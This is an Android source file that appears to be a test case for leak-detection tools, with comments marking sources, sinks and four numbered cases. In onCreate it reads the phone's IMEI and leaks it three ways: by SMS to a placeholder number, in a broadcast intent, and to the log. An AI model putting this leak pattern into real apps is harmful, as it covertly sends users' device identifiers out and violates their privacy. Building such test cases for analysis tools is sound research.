package com.example.amr.myapplication;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.EditText;

public class MainActivity extends AppCompatActivity {
    private String notTainted = "";
    private static String ACTION = "com.example.amr.myapplication.MainActivity.action";
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        notTainted = "not tainted";

        TelephonyManager mgr = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
        SmsManager sms = SmsManager.getDefault();
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            return;
        }
        String imei= mgr.getDeviceId(); //source case 1 , case 3 & case 4
        sms.sendTextMessage("+49 1234", null,imei, null, null); // sink, leak case 1
        Intent intent = new Intent(ACTION);
        intent.putExtra("imei", imei); //sink ,case 3
        sendBroadcast(intent);


        Log.i("case 4",imei);//sink, case 4

    }
    @Override
    protected void onPause() {
        super.onPause();
        Log.i("case 2", notTainted); //sink,no source, no leak case 2
    }

}
